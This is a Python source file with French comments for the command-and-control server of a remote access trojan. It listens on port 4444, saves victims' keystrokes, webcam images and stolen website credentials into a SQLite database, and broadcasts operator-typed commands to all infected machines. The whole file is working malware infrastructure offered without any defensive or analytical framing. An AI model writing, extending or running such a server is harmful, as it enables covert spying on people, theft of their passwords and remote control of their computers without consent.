import socket
import threading
import sqlite3
from datetime import datetime
import os
import json

# Configuration
SERVER_HOST = '0.0.0.0'
SERVER_PORT = 4444
DB_PATH = "bdd/rat.db"
CAPTURE_DIR = "captures"

# Initialisation des dossiers
os.makedirs(CAPTURE_DIR, exist_ok=True)

# Connexion à la base de données
conn = sqlite3.connect(DB_PATH, check_same_thread=False)
cursor = conn.cursor()

clients = []

# ------------------ Sauvegarde des Données ------------------

def save_keystroke(target_ip, key_pressed):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO keystrokes (timestamp, target_ip, key_pressed) VALUES (?, ?, ?)",
                   (timestamp, target_ip, key_pressed))
    conn.commit()

def save_webcam_capture(target_ip, file_path):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    cursor.execute("INSERT INTO webcam (timestamp, target_ip, file_path) VALUES (?, ?, ?)",
                   (timestamp, target_ip, file_path))
    conn.commit()

def save_passwords(target_ip, passwords):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    for password in passwords:
        cursor.execute("""INSERT INTO passwords (target_ip, timestamp, url, username, password)
                          VALUES (?, ?, ?, ?, ?)""",
                       (target_ip, timestamp, password['url'], password['username'], password['password']))
    conn.commit()

# ------------------ Traitement des Données Reçues ------------------

def process_data(data, client_ip):
    try:
        parsed_data = json.loads(data)
        data_type = parsed_data.get("type")

        if data_type == "keystroke":
            save_keystroke(client_ip, parsed_data.get("data"))

        elif data_type == "webcam_capture":
            filename = parsed_data.get("filename", "capture.jpg")
            img_data = bytes.fromhex(parsed_data.get("data"))
            file_path = os.path.join(CAPTURE_DIR, filename)
            with open(file_path, "wb") as img_file:
                img_file.write(img_data)
            save_webcam_capture(client_ip, file_path)

        elif data_type == "passwords":
            passwords = parsed_data.get("data", [])
            save_passwords(client_ip, passwords)

        else:
            print(f"[Erreur] Type de données non supporté : {data_type}")

    except Exception as e:
        print(f"[Erreur] lors du traitement des données : {e}")

# ------------------ Gestion des Clients ------------------

def handle_client(client_socket, client_address):
    print(f"[+] Connexion de {client_address}")
    while True:
        try:
            data = client_socket.recv(1048576).decode('utf-8')
            if data:
                process_data(data, client_address[0])
        except:
            break
    client_socket.close()
    print(f"[-] Déconnexion de {client_address}")

def accept_connections(server_socket):
    while True:
        client_socket, client_address = server_socket.accept()
        clients.append(client_socket)
        thread = threading.Thread(target=handle_client, args=(client_socket, client_address))
        thread.start()

def send_command(command):
    for client in clients:
        try:
            client.send(command.encode('utf-8'))
        except:
            clients.remove(client)

# ------------------ Lancement du Serveur ------------------

server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server_socket.bind((SERVER_HOST, SERVER_PORT))
server_socket.listen(5)
print(f"[*] Serveur en écoute sur {SERVER_HOST}:{SERVER_PORT}...")

threading.Thread(target=accept_connections, args=(server_socket,)).start()

while True:
    command = input("Admin > ")
    if command == "exit":
        break
    send_command(command)

server_socket.close()
conn.close()
